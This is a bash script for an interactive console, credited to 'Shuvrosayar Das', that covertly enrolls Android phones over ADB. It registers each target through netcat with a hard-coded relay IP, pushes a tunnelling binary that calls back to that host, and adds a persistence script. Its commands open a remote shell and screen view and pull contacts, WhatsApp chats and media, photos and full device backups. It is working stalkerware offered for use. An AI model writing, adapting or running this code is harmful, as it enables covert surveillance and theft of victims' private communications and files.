#!/bin/bash




echo " ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄ "
echo "▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌"
echo "▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀      ▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀      ▐░█▀▀▀▀▀▀▀▀▀ "
echo "▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌               ▐░▌          ▐░▌               ▐░▌     ▐░▌          ▐░▌       ▐░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ "
echo "▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌          ▐░▌               ▐░▌     ▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌          ▐░░░░░░░░░░░▌"
echo "▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░▌               ▐░▌     ▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌           ▀▀▀▀▀▀▀▀▀█░▌"
echo "▐░█▀▀▀▀▀▀▀▀▀      ▐░▌     ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌     ▐░▌          ▐░▌               ▐░▌     ▐░▌ ▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     ▐░▌                    ▐░▌"
echo "▐░▌               ▐░▌     ▐░▌     ▐░▌            ▐░▌     ▐░▌          ▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌                    ▐░▌"
echo "▐░▌           ▄▄▄▄█░█▄▄▄▄ ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌     ▐░▌           ▄▄▄▄▄▄▄▄▄█░▌"
echo "▐░▌          ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌          ▐░░░░░░░░░░░▌"
echo " ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀            ▀▀▀▀▀▀▀▀▀▀▀ "
echo "																			       "
echo "										---By Shuvrosayar Das (The SAYAR)"                                                                                                                                                         

for((;;))
do
read -p "FL5>" command
if [ "$command" = ":live" ]
then
echo "[i]Sending Information To Cloud Command..."
read -p "ENTER NAME OF TARGET: " name
grepstring=`echo $name | nc 52.66.8.185 8003`


echo "[i]Information Stored In Cloud Command..."
fwdport=$(echo "$grepstring" | grep -oE '^([0-9]+)' | cut -d' ' -f1)
connectport=$(echo "$grepstring" | grep -oE ' [0-9]+ ' | cut -d' ' -f2)

echo $grepstring >>targetfile

adb -d push ./ngroka /data/local/tmp
adb -d tcpip 5555
echo """
[i]PLEASE ENSURE THE FOLLOWING:
1) Internet Should Be Available (WiFi/Mobile Data)
2)USB Should Be Connected
3.)Follow the Steps Accurately"""
read -p "[i]Check if target device is reconnected with USB using adb devices and press 'Enter' to continue." line


adb -d shell "HOME=/data/local/tmp/ ;chmod +x /data/local/tmp/ngroka;(setsid /data/local/tmp/ngroka -e 52.66.8.185:$fwdport &)" &

echo "[i]Please wait till we spawn the shell for you"
sleep 10



adb connect 52.66.8.185:$connectport

elif [ "$command" = ":wilive" ]
then
echo """
[i]PLEASE ENSURE THE FOLLOWING:
1) Internet Should Be Available (WiFi/Mobile Data)
2)USB Should Be Connected
3.)Follow the Steps Accurately"""

echo "[i]Sending Information To Cloud Command..."
read -p "ENTER IP ADDRESS OF TARGET: " ipadd
read -p "ENTER NAME OF TARGET: " name
grepstring=`echo $name | nc 52.66.8.185 8003`


echo "[i]Information Stored In Cloud Command..."
fwdport=$(echo "$grepstring" | grep -oE '^([0-9]+)' | cut -d' ' -f1)
connectport=$(echo "$grepstring" | grep -oE ' [0-9]+ ' | cut -d' ' -f2)

echo $grepstring >>targetfile

adb connect $ipadd:5555

sleep 5

cp wiscript wilive.sh
sed -i "1s/^/fwdport=$fwdport\n/" wilive.sh
adb -s $ipadd:5555 push ./wilive.sh /data/local/tmp/wilive.sh
adb -s $ipadd:5555 push ./ngroka /data/local/tmp/ngroka

adb -s $ipadd:5555 shell "HOME=/data/local/tmp/ ;chmod +x /data/local/tmp/wilive.sh;(setsid /data/local/tmp/wilive.sh &)" &

echo "[i]Please wait till we spawn the shell for you"
sleep 10



adb connect 52.66.8.185:$connectport



elif [ "$command" = ":help" ]
then
echo """
:live       - Install The Monitoring Program
:wilive     - Install The Monitoring Program Wirelessly
:reconnect  - Reconnect to A Target Device
:contacts   - Import All Contacts
:whatsapp   - Create WhatsApp Backup<Contacts,Groups,Chats,Settings>
:shell      - Get Shell Access To Device
:media      - Import All Accessible Media Files
:packages   - List All Installed Packages
:backpack   - Back Up data and APK of A Specific Package
:fullback   - Full Backup Of Phone
:restore    - Restore a Previously Made Full Backup
:help 	    - Show This Help Message
:targets    - Show enrolled targets
:persist    - Persist Session by Turning on Net Automatically and connecting back
:wamediaall - Dump All WhatsApp Media
:wamedia    - Dump Specific WhatsApp Media
"""
elif [ "$command" = ":targets" ]
then
echo "TX TID TN"
cat targetfile
read -p "ENTER TID OF THE PHONE YOU WANT TO MONITOR: " tid

elif [ "$command" = ":issrea" ]
then

adb -s 52.66.8.185:$tid shell dumpsys activity recents > issrea1
extracted1=`sed -n '/Visible recent tasks (most recent first)/,$p' issrea1`
beginningdumpsys=`adb -s 52.66.8.185:$tid shell dumpsys activity | grep "topActivity"| head -n1`
beginningtop="$(echo "$beginningdumpsys" | grep -oP '{\K[^/]*(?=/)')"

ids=($(echo $extracted1 | grep -o 'id=[0-9]*' | awk -F= '{print $2}'))

#for id in "${ids[@]}"
#do
#  echo "$id"
#done

scrcpy -s 52.66.8.185:$tid --video-bit-rate 2M  --max-fps 15 --max-size 960

adb -s 52.66.8.185:$tid shell dumpsys activity recents > issrea2
extracted2=`sed -n '/Visible recent tasks (most recent first)/,$p' issrea2`


ids2=($(echo $extracted2 | grep -o 'id=[0-9]*' | awk -F= '{print $2}'))

for element in "${ids2[@]}"
do
    # Check if the element is present in array2
    if [[ "${ids[*]}" =~ "$element" ]]; then
        echo "RESTORATION IN PROGRESS"
    else
        adb -s 52.66.8.185:$tid shell am stack remove $element 
    fi
done

error="$(adb -s 52.66.8.185:$tid shell "am start $beginningtop 2>&1")"

#echo "$error" 
if echo "$error" | grep -q "Error";
then
adb -s 52.66.8.185:$tid shell "am start -a android.intent.action.MAIN -c android.intent.category.HOME"
fi

elif [ "$command" = ":persist" ]
then
echo "TX TID TN"
cat targetfile
read -p "ENTER TX OF THE PHONE TO PERSIST: " tx
cp lightscriptbeta2.sh afterlife.sh
sed -i "1s/^/fwdport=$tx\n/" afterlife.sh
adb -s 52.66.8.185:$tid push ./afterlife.sh /data/local/tmp/afterlife.sh 
adb -s 52.66.8.185:$tid shell "chmod +x /data/local/tmp/afterlife.sh"
adb -s 52.66.8.185:$tid shell "(setsid /data/local/tmp/afterlife.sh &)" > /dev/null 2>&1 &
rm afterlife.sh

elif [ "$command" = ":reconnect" ]
then
echo "TX TID TN"
cat targetfile
read -p "ENTER TID OF PHONE TO RECONNECT: " value
adb disconnect 52.66.8.185:$value
adb connect 52.66.8.185:$value

elif [ "$command" = ":shell" ]
then
adb -s 52.66.8.185:$tid shell


elif [ "$command" = ":whatsapp" ]
then
python3 "wa_kdbe.py"
elif [ "$command" = ":contacts" ]
then
echo "[i]Fetching All Contact Information..."
adb -s 52.66.8.185:$tid shell content query --uri content://com.android.contacts/data > contacts.txt
echo "[i]Contact Information Saved in contacts.txt"
elif [ "$command" = ":packages" ]
then
adb -s 52.66.8.185:$tid shell pm list packages
elif [ "$command" = ":fullback" ]
then
echo "[i]Creating Folder fullbackup in devicebackup/ ..."
mkdir ./devicebackup/fullbackup
echo "[i]Creating Full Backup Of Device. This might take some time depending on data size..."
adb -s 52.66.8.185:$tid backup -apk -shared -all -system -f ./devicebackup/fullbackup/fullbackup.ab
echo "[i]Full Backup Created at backup.ab"
elif [ "$command" = ":restore" ]
then
echo "[i]Restoring previously made backup..."
adb -s 52.66.8.185:$tid restore ./devicebackup/backup.ab
echo "[i]Backup Restored!"
elif [ "$command" = ":backpack" ]
then
read -p "[i/o]Enter Package Name: " pkg
echo "[i]Creating Folder $pkg in devicebakup/ ..."
mkdir ./devicebackup/$pkg
echo "[i]Creating Backup in devicebackup/$pkg/ as $pkg.ab"
adb -s 52.66.8.185:$tid backup -apk $pkg -f ./devicebackup/$pkg.ab
echo "[i]Backup Created!"
elif [ "$command" = ":screen" ]
then
scrcpy -s 52.66.8.185:$tid --video-bit-rate 2M  --max-fps 15 --max-size 960 &
elif [ "$command" = ":media" ]
then
echo "[i]Creating media Directory in devicebackup/ ..."
mkdir ./devicebackup/media
echo "[i]Dumping All Media From Device. This might take some time depending on data size..."
adb -s 52.66.8.185:$tid pull /storage/self/primary/DCIM ./devicebackup/media/
echo "[i]Dump Complete!"
elif [ "$command" = ":wamediaall" ]
then
echo "[i]Creating wamedia Directory in devicebackup/ ..."
mkdir devicebackup/
mkdir devicebackup/wamedia/
echo "[i]Dumping All Media From Device. This might take some time depending on data size..."
adb -s 52.66.8.185:$tid pull /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/ ./devicebackup/wamedia
echo "[i]Dump Complete!"
elif [ "$command" = ":wamedia" ]
then
echo "[i]Creating media Directory in devicebackup/ ..."
mkdir devicebackup/
mkdir devicebackup/media/
read -p """
1. Documents
2. Videos
3. Pictures
4. Audio
5. Voice Notes

Enter Option:
""" opt
	if [ "$opt" = "1" ]
	then 
	adb -s 52.66.8.185:$tid pull "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents" ./devicebackup/wamedia
	elif [ "$opt" = "2" ]
	then
	adb -s 52.66.8.185:$tid pull "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video" ./devicebackup/wamedia
	elif [ "$opt" = "3" ]
	then
	adb -s 52.66.8.185:$tid pull "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images" ./devicebackup/wamedia
	elif [ "$opt" = "$4" ]
	then
	adb -s 52.66.8.185:$tid pull "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio" ./devicebackup/wamedia
	elif [ "$opt" = "5" ]
	then
	adb -s 52.66.8.185:$tid pull "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes" ./devicebackup/wamedia
	fi

echo "[i]Dump Complete!"


fi

done
